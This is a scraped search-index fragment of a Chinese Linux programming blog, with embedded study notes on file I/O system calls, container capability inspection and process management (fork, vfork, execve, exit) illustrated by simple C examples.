        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-xi-tong-bian-cheng-wen-jian-io/"" data-c="
          &lt;h2 id=&#34;文件的基本原理&#34;&gt;文件的基本原理&lt;/h2&gt;
&lt;p&gt;当进程每打开一个文件，内核会为其返回一个文件描述符fd，是一个非负int整数，之后对文件的操作需要以fd作为主要参数。一般从0算起，上限为1024-1，但可以设定上限值。&lt;/p&gt;
&lt;p&gt;每个进程默认会打开三个文件，其文件描述符分别为&lt;code&gt;STDIN_FILENO STDOUT_FILENO STDERR_FILENO&lt;/code&gt;，即0 1 2，分别表示标准输入、标准输出、标准错误。&lt;/p&gt;
&lt;p&gt;文件描述符不仅能表示普通文件，还能表示设备文件、目录、socket等等。&lt;/p&gt;
&lt;h2 id=&#34;打开文件&#34;&gt;打开文件&lt;/h2&gt;
&lt;h3 id=&#34;open系统调用&#34;&gt;open()系统调用&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int open(const char *name, int flags, mode_t mode);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将路径name所指定的文件映射至一个文件描述符并返回，flags可取&lt;code&gt;O_RDONLY O_WRONLY O_RDWR&lt;/code&gt;，只读、只写、读写。文件位置会设置到开头。&lt;/p&gt;
&lt;p&gt;flags上述三种打开文件的方式还可以与以下常用参数进行&lt;strong&gt;按位逻辑或&lt;/strong&gt;。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;flags&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_APPEND&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;附加模式打开&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_CREAT&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;如果文件不存在，则创建，如果存在则需要同时指定O_EXCL将会调用失败&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_EXCL&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;如果指定O_CREAT且文件存在，则此标志会导致调用失败&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_DIRECT&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;打开文件以便进行直接I/O&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_NOFOLLOW&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;如果name是一个符号链接，则会调用失败，但如果目录是符号链接，文件不是，也会打开成功&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;O_NONBLOCK&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;以非阻挡模式打开文件，即进程在open时或者其它操作时都不会阻挡正在进行的I/O，此行为只能用于定义FIFO&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;只要不是在创建文件，则mode可以忽略。&lt;/p&gt;
&lt;p&gt;在创建文件时需要设定文件使用权限，也是按位逻辑或。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;mode&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRWXU&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;拥有者具有读取、写入和执行的权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRUSR&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;拥有者具有读取的权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IWUSR&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;拥有者具有写入的权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IXUSR&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;拥有者具有执行权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRWXG&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;组具有读取、写入和执行权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRGRP&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;组 读取&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IWGRP&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;组 写入&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IXGRP&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;组 执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IRWXO&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;其他人 读写执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IROTH&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;其他人 读&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IWOTH&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;其他人 写&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;S_IXOTH&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;其他人 执行&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int fd = open(&amp;quot;/home/test&amp;quot;, O_WRONLY | O_APPEND)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;creat系统调用&#34;&gt;creat()系统调用&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int creat(const char *name, mode_t mode);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;read系统调用&#34;&gt;read()系统调用&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;ssize_t read(int fd, void *buf, size_t len);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从fd所引用的文件的当前位置读取len个字节到buf，执行成功返回写入buf的字节数目，执行失败返回-1并设定errno。文件位置会前进到fd所读取的字节数目。&lt;/p&gt;
&lt;p&gt;如果fd代表的是一个字符设备文件，则每次只会从当前位置读取数据。&lt;/p&gt;
&lt;h3 id=&#34;read过程会产生的错误&#34;&gt;read过程会产生的错误&lt;/h3&gt;
&lt;p&gt;在read过程中会出现以下情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回值等于len，即预期结果。&lt;/li&gt;
&lt;li&gt;返回值小于len，但大于0，可能原因时可读取的字节数小于len，或者收到系统中断信号。&lt;/li&gt;
&lt;li&gt;返回0，表示EOF，到达了文件末尾。&lt;/li&gt;
&lt;li&gt;返回-1，errno=EINTR，在读取前收到中断。&lt;/li&gt;
&lt;li&gt;返回-1，error=EAGAIN，表示读取操作被阻挡，因为可供读取的数据尚未出现，稍后应该再次进行调用，此情况只发生在非阻塞模式中。&lt;/li&gt;
&lt;li&gt;返回值-1，error=EINTR或EAGAIN以外的值，表示更严重的错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;读取所有字节&#34;&gt;读取所有字节&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;ssize_t ret;

while(len != 0 &amp;amp;&amp;amp; (ret = read(fd, buf, len)) != 0){
    if(ret == -1){
        if(errno == EINTR) continue;
        perror(&amp;quot;read&amp;quot;);
        break;
    }
    len -= ret;
    buf +=ret;
}
/*
程序循环会从fd的当前文件位置读取len个字节到buf。它会继续读完len个字节或直接抵达EOF。

如果所读取的字节数目大于0，但小于len，则len的值会减去已读取的字节数目，
buf的值会加上已读取的字节数目，并且再次调用；
如果返回-1，errno=EINTR，则不需要更新参数就可以再次进行此调用；
如果返回-1，errno设定为其他值，则会调用perror()说明相关错误，终止循环。
*/
&lt;/code&gt;&lt;/pre&gt;
">【linux】文件I/O</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-capability/"" data-c="
          &lt;p&gt;使用capsh -print可以输出当前容器所具有的cap权限列表。但并非所有容器内都有此命令，可以通过cat /proc/1/status获取cap的hex记录，再使用capsh --decode解码出cap。&lt;/p&gt;
">【linux】capability</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-jin-cheng-guan-li/"" data-c="
          &lt;h2 id=&#34;进程&#34;&gt;进程&lt;/h2&gt;
&lt;p&gt;对于操作系统来说，进程是一个很重要的抽象，进程的抽象是为了提高CPU的利用率，任何的抽象都需要一个物理基础，进程的物理基础便是程序。&lt;/p&gt;
&lt;h3 id=&#34;程序和进程的区别&#34;&gt;程序和进程的区别：&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;进程是操作系统分配内核、CPU时间片等资源的基本单位。&lt;/li&gt;
&lt;li&gt;程序是完成特定任务的指令集合，包含可运行的一堆CPU指令和响应的数据等信息；进程不仅包含代码段等信息，还有很多运行时需要的资源。&lt;/li&gt;
&lt;li&gt;进程是一段执行中的程序，进程包含了可执行代码的代码段，存放变量、函数、返回值等信息的用户栈、存放进程相关数据的数据段，用于内核中进程切换的内核栈，以及动态分配内存的堆等。&lt;/li&gt;
&lt;li&gt;进程是并发执行的一个实体，实现对CPU的虚拟化的核心技术是&lt;strong&gt;上下文切换&lt;/strong&gt;以及&lt;strong&gt;进程调度&lt;/strong&gt;。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;进程分类&#34;&gt;进程分类：&lt;/h3&gt;
&lt;p&gt;根据运行模式分为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;核心态进程&lt;/li&gt;
&lt;li&gt;用户态进程&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;用户态进程要执行一些核心态指令，会产生系统调用。&lt;/p&gt;
&lt;p&gt;根据进程特点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;交互进程(&lt;code&gt;shell&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;批处理进程&lt;/li&gt;
&lt;li&gt;守护进程&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;根据进程状态：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;守护进程(守护进程的父进程都是init进程)&lt;/li&gt;
&lt;li&gt;孤儿进程(父进程退出，子进程被init收养)&lt;/li&gt;
&lt;li&gt;僵尸进程(进程结束，但没有释放内存)&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;进程描述符&#34;&gt;进程描述符&lt;/h3&gt;
&lt;p&gt;进程所拥有的资源抽象为进程控制块，即进程的资源及属性保存在进程控制块(PCB)中，linux中定义了&lt;code&gt;task_struct&lt;/code&gt;来保存进程属性。&lt;/p&gt;
&lt;p&gt;PCB需要描述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进程的运行状态：就绪、运行、阻塞、等待等等&lt;/li&gt;
&lt;li&gt;程序计数器：记录当前进程运行到哪条指令&lt;/li&gt;
&lt;li&gt;CPU寄存器：保存当前运行的上下文，例如CPU寄存器信息，以便进程调度的数据恢复&lt;/li&gt;
&lt;li&gt;CPU调度信息：包括进程优先级、调度队列和调度等相关信息&lt;/li&gt;
&lt;li&gt;内存管理信息：进程使用的内存信息，比如进程的页表等&lt;/li&gt;
&lt;li&gt;统计信息：包含进程运行时间等相关的统计信息&lt;/li&gt;
&lt;li&gt;文件相关信息：包括进程打开的文件等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;linux内核利用链表task_list来存放所有进程描述符，task_struct数据结构&lt;strong&gt;定义&lt;/strong&gt;在include/linux/sched.h文件中。&lt;/p&gt;
&lt;h4 id=&#34;进程属性相关信息&#34;&gt;进程属性相关信息&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;state：记录进程的状态，主要有TASK_RUNNING | TASK_INTERRUPTIBLE | TASK_UNINTERRUPTIBLE | EXIT_ZOMBIE | TASK_DEAD 等几个状态&lt;/li&gt;
&lt;li&gt;pid：进程标识符&lt;/li&gt;
&lt;li&gt;flag：进程属性标志位，标志位定义在include/linux/schude.h中，例如，程序退出时设置PF_EXITING；进程是一个workqueue类型的工作项成时会设置PF_WQ_WORKER；fork完成之后不执行exec命令时，会设置PF_FORKNOEXEC等。&lt;/li&gt;
&lt;li&gt;exit_code和exit_signal成员：用来存放进程退出值和终止信号，这样父进程可以知道子进程的退出原因&lt;/li&gt;
&lt;li&gt;pdeath_signal：父进程消亡时发出的信号&lt;/li&gt;
&lt;li&gt;comm：存放可执行程序的名称&lt;/li&gt;
&lt;li&gt;real_cred和cred：用来存放进程的一些认证信息，struct cred数据结构里包含了uid、gid等信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;调度相关信息&#34;&gt;调度相关信息&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;prio：进程动态优先级，是调度类考虑的优先级&lt;/li&gt;
&lt;li&gt;static_prio：静态优先级，在进程启动时分配，内核不存储nice值，取而代之的是static_prio。&lt;/li&gt;
&lt;li&gt;normal_prio：基于static_prio和调度策略计算的优先级&lt;/li&gt;
&lt;li&gt;tr_priority：实时进程的优先级&lt;/li&gt;
&lt;li&gt;sched_class：调度类&lt;/li&gt;
&lt;li&gt;se：普通进程调度实体&lt;/li&gt;
&lt;li&gt;rt：实时进程调度实体&lt;/li&gt;
&lt;li&gt;dl：deadline进程调度实体&lt;/li&gt;
&lt;li&gt;policy：用来确定进程的类型，比如是普通类型还是实时进程&lt;/li&gt;
&lt;li&gt;cpus_allowed：进程可以在哪几个CPU上工作&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;进程间关系&#34;&gt;进程间关系&lt;/h4&gt;
&lt;p&gt;系统中最初的第一个进程是idle进程（0号进程），此后每个进程都有一个父进程，也可以创建子进程，同时也可能有兄弟进程。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;real_parent：指向父进程的task_struct数据结构&lt;/li&gt;
&lt;li&gt;children：指向当前进程的子进程的链表&lt;/li&gt;
&lt;li&gt;sibling：指向当前进程的兄弟进程的链表&lt;/li&gt;
&lt;li&gt;group_leader：进程组的组长&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;内存管理和文件管理相关信息&#34;&gt;内存管理和文件管理相关信息&lt;/h4&gt;
&lt;p&gt;进程在加载运行之前需要加载到内存中，因此PCB里必须有一个抽象描述内存相关的信息，有一个指向mm_struct数据结构的指针mm。此外，进程在生命周期内总是需要通过打开文件、读写文件等操作来完成一些任务，这就和文件系统密切相关了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mm：指向进程所管理的内存的一个总的抽象的数据结构mm_struct&lt;/li&gt;
&lt;li&gt;fs成员：保存一个指向文件系统信息的指针&lt;/li&gt;
&lt;li&gt;files成员：保存一个指向内存的文件描述符表的指针&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;进程的生命周期&#34;&gt;进程的生命周期&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1630227651424.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;进程标识&#34;&gt;进程标识&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;pid的分配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;父进程为ppid，内核最大pid为32768，这是为了兼容旧版本unix系统，采用16为数据类型，可通过对&lt;code&gt;/proc/sys/kernel/pid_max&lt;/code&gt;修改，代价是降低兼容性。&lt;/p&gt;
&lt;p&gt;内核会严格使用线性方程为进程分配pid，使用过的pid不再使用，除非超过最大值而循环使用较小的pid。&lt;/p&gt;
&lt;p&gt;在内核中，pid被定义成&lt;code&gt;pid_t&lt;/code&gt;类型，通常是对int类型重新定义(typedef)。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    printf(&amp;quot;%d %d&amp;quot;, getpid(), getppid());
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;进程的家族关系&#34;&gt;进程的家族关系&lt;/h3&gt;
&lt;p&gt;linux内核在启动时会有一个init_task进程，即0号进程或idle进程，然后初始化完成后会创建一个init进程，即1号进程，它是所有进程的祖先。&lt;/p&gt;
&lt;p&gt;空闲进程(idle process)：pid=0，当没有进程可运行时，内核会运行此进程。&lt;br&gt;
初始化进程(init process)：pid=1，系统启动后内核执行的第一个进程。&lt;/p&gt;
&lt;p&gt;init进程会按照以下四个顺序尝试执行：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sbin/init&lt;/code&gt;：首选和最有可能摆放init进程的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/init&lt;/code&gt;：另一个可能摆放init进程的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/bin/init&lt;/code&gt;：一个可能摆放init进程的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/bin/sh&lt;/code&gt;：如果内核无法找到init进程，则会尝试运行它&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果都无法执行，则内核会发生panic而停止系统。&lt;/p&gt;
&lt;p&gt;内核取得控制权后，由init进程负责处理启动过程的剩余步骤，包括初始化系统，启动服务以及执行一个登录程序。&lt;/p&gt;
&lt;p&gt;init_task（0号进程）进程的task_struct数据结构通过INIT_TASK宏来赋值，定义在include/linux/init_task.h文件中。&lt;/p&gt;
&lt;p&gt;除此之外，所有进程的task_struct数据结构都通过list_head类型的双向链表链在一起，因此每个task_struct数据结构都包含一个list_head类型的tasks成员。这个链表的头是init_task进程，即0号进程，init_task进程的tasks.prev字段指向链表中最后插入的进程task_struct数据结构的tasks成员。&lt;/p&gt;
&lt;p&gt;linux提供了一个常用的宏for_each_process(p)，来扫描系统中所有的进程，这个宏从init_task进程开始遍历，一直循环到init_task为止。&lt;/p&gt;
&lt;h3 id=&#34;运行一个新进程&#34;&gt;运行一个新进程&lt;/h3&gt;
&lt;p&gt;在unix中，一个进程的创建其实是包括两个步骤的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建(派生)一个&lt;strong&gt;新进程&lt;/strong&gt;(fork)&lt;/li&gt;
&lt;li&gt;执行一个&lt;strong&gt;新程序&lt;/strong&gt;(将新程序加载到内存中执行)(exec)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在unix中，这两个步骤是分开的。&lt;/p&gt;
&lt;p&gt;所以在创建子进程执行一个新程序通常会先&lt;code&gt;fork()&lt;/code&gt;，然后&lt;code&gt;exec()&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&#34;进程控制函数&#34;&gt;进程控制函数&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;fork()&lt;/code&gt;函数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;创建子进程，并运行与当前进程相同的映像。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;unistd.h&amp;gt;
pid_t fork(void);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;unistd.h&lt;/code&gt;封装了类UNIX系统下的很多固定名称的system_call系统调用。所以，这个函数是依赖于编译器，依赖于操作系统的。&lt;/p&gt;
&lt;p&gt;父进程调用&lt;code&gt;fork&lt;/code&gt;函数创建子进程，会在父进程中返回子进程的进程id，在子进程中返回0。父进程无法通过函数获取子进程id，而子进程可以通过&lt;code&gt;getppid()&lt;/code&gt;获得父进程id。&lt;/p&gt;
&lt;p&gt;通常&lt;code&gt;fork&lt;/code&gt;函数有两种用法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;父进程希望复制自己，使父子进程执行不同的代码。例如网络服务，父进程等待客户端请求，请求达到时，创建子进程执行此请求，父进程继续等待新请求。&lt;/li&gt;
&lt;li&gt;一个进程要执行不同的程序。子进程从&lt;code&gt;fork&lt;/code&gt;函数返回后，立即调用&lt;code&gt;exec&lt;/code&gt;函数(创建了一个全新进程)，子进程在&lt;code&gt;fork&lt;/code&gt;函数和&lt;code&gt;exec&lt;/code&gt;函数之间可以更改自己的属性。例如&lt;code&gt;shell&lt;/code&gt;中，子进程创建后立即调用&lt;code&gt;exec&lt;/code&gt;函数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个进程调用了&lt;code&gt;fork&lt;/code&gt;函数后，系统先给新的进程分配资源，把原来的变量赋值到子进程中，只有少数变量域原来进程的变量不同，相当于克隆了自己。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
int main()
{
    pid_t fpid;
    int count = 10;
    fpid = fork();
    printf(&amp;quot;fpid = %d\n&amp;quot;, fpid);
    if(fpid &amp;lt; 0) printf(&amp;quot;error\n&amp;quot;); // 如果出现错误，会返回一个负值
    else if(fpid == 0) printf(&amp;quot;i am child process, my pid = %d, count = %d\n&amp;quot;, getpid(), ++count);
    else printf(&amp;quot;im child parent process, my pid = %d, count = %d\n&amp;quot;, getpid(), ++count);
    return 0;
    /*
        fpid = 3919
        im child parent process, my pid = 3918, count = 11
        fpid = 0
        i am child process, my pid = 3919, count = 11
    */
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;code&gt;vfork&lt;/code&gt;函数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;vfork&lt;/code&gt;函数与&lt;code&gt;fork&lt;/code&gt;函数不同的地方是，&lt;code&gt;vfork&lt;/code&gt;函数会保证子进程先运行，在它调用&lt;code&gt;exec&lt;/code&gt;函数或者&lt;code&gt;exit&lt;/code&gt;函数之后父进程才可能被调度运行，子进程在调用&lt;code&gt;exec&lt;/code&gt;或&lt;code&gt;exit&lt;/code&gt;函数之前与父进程数据是共享的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
    pid_t pid;
    int count = 0;
    pid = vfork();

    if(pid &amp;lt; 0) printf(&amp;quot;error.\n&amp;quot;);
    else if(pid == 0)
    {
        printf(&amp;quot;child, count = %d\n&amp;quot;, ++count);
        exit(0);
    }
    else printf(&amp;quot;father, count = %d\n&amp;quot;, ++count);

    return 0;
}
/*
    child, count = 1
    father, count = 2
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;exec&lt;/code&gt;函数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;exec&lt;/code&gt;不是单一的函数，而是一个系列。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;execl(const char *path, const char *arg, ...);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此函数可以取代调用进程的内容，子进程可以调用&lt;code&gt;execve&lt;/code&gt;函数执行另一个程序。当调用&lt;code&gt;execve&lt;/code&gt;函数时，进程执行的程序完全被替换为新程序，但其进程ID并不变，只是用新程序替换了当前进程的正文、数据、堆和栈段。&lt;code&gt;execve&lt;/code&gt;函数族的工作过程与&lt;code&gt;fork&lt;/code&gt;函数完全不同，&lt;code&gt;fork&lt;/code&gt;函数是在复制一份原进程，而&lt;code&gt;execve&lt;/code&gt;函数是用第一个参数指定的程序覆盖现在有进程空间。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;int execve(const char *filename, const char *argv[], const char *envp[])&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;第1个参数&lt;code&gt;filename&lt;/code&gt;是可执行程序文件名称，第2个参数&lt;code&gt;argv&lt;/code&gt;是需要传递给可执行程序的参数，第3个参数是环境变量数组，第2、3个参数都需要有空指针NULL为结束标识。如果调用成功则加载新的程序从启动代码开始执行，不再返回；如果调用出错则返回-1。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// mult.c
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
int main(int argc, char *argv[])
{
    int a = atoi(argv[1]);
    int b = atoi(argv[2]);
    printf(&amp;quot;%d * %d = %d\n&amp;quot;, a, b, a*b);
    return 0;
}

// main.c

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
int main()
{
    char *argv1[] = {&amp;quot;mult&amp;quot;, &amp;quot;2&amp;quot;, &amp;quot;10&amp;quot;, NULL};
    char *envp[] = {&amp;quot;PATH=/root&amp;quot;, NULL};
    execve(&amp;quot;./mult&amp;quot;, argv1, envp);
    return 0;
}

/*
    2 * 10 = 20
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;code&gt;exit&lt;/code&gt;函数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;进程退出的方式有以下5种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;main&lt;/code&gt;函数的自然返回&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;exit&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;_exit&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;abort&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;接收到能导致进程终止的信号&lt;code&gt;Ctrl+C(SIGINT)&lt;/code&gt;，&lt;code&gt;Ctrl+\(SIGQUIT)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前三种是正常的终止，但无论哪种那种，进程终止时都将执行相同的关闭打开的文件操作，释放占用的内容等资源。&lt;/p&gt;
&lt;p&gt;当程序执行到&lt;code&gt;exit&lt;/code&gt;和&lt;code&gt;_exit&lt;/code&gt;函数时，会无条件停下剩下的所有操作，清楚包括PCB在内的各种数据结构，并终止程序的运行。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1622093808796.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    printf(&amp;quot;EXIT&amp;quot;);
    exit(0);
}

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    printf(&amp;quot;EXIT&amp;quot;);
    _exit(0);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面这两个例子，第一个会输出&lt;code&gt;EXIT&lt;/code&gt;，而第二个不会输出。这是因为&lt;code&gt;printf&lt;/code&gt;函数使用的时缓冲I/O方式，该函数在遇到&lt;code&gt;\n&lt;/code&gt;换行符时自动从缓冲区中将记录读出。&lt;code&gt;exit(0)&lt;/code&gt;会在终止进程前，将缓冲I/O内容清除掉，所以即使&lt;code&gt;printf&lt;/code&gt;函数里没有&lt;code&gt;\n&lt;/code&gt;换行符也会打印出。而&lt;code&gt;_exit(0)&lt;/code&gt;没有清楚缓冲区，因此不会打印。&lt;/p&gt;
&lt;h2 id=&#34;守护进程&#34;&gt;守护进程&lt;/h2&gt;
